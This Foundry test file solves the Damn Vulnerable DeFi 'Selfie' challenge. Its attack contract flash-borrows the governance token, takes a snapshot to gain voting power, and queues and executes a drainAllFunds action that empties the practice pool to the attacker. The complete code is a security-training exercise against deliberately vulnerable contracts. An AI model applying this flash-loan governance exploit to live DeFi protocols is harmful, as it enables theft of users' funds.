// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract AttackContract {
    SimpleGovernance internal governance;
    SelfiePool internal pool;
    DamnValuableTokenSnapshot internal dvt;
    address internal owner;
    uint256 internal actionId;

    constructor(SimpleGovernance _governance, SelfiePool _pool, DamnValuableTokenSnapshot _dvt) {
        governance = _governance;
        pool = _pool;
        dvt = _dvt;
        owner = msg.sender;
    }

    function receiveTokens(address token, uint256 amount) external {
        require(msg.sender == address(pool), "not pool call");
        require(token == address(dvt), "not right token");
        //new shapshot
        dvt.snapshot();
        //repay back
        dvt.transfer(address(pool), amount);
    }

    function attack() public {
        uint256 balance = dvt.balanceOf(address(pool));
        uint256 gov_balance = dvt.balanceOf(address(governance));
        pool.flashLoan(balance);

        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", owner);
        //action
        actionId = governance.queueAction(address(pool), data, 0);
    }
    //after 2 days ,execute

    function executeAction() external {
        governance.executeAction(actionId);
    }
}

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(address(dvtSnapshot), address(simpleGovernance));

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploitSelfie() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        AttackContract attackContract = new AttackContract(simpleGovernance, selfiePool, dvtSnapshot);
        attackContract.attack();
        //after
        vm.warp(block.timestamp + simpleGovernance.getActionDelay());
        attackContract.executeAction();
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}
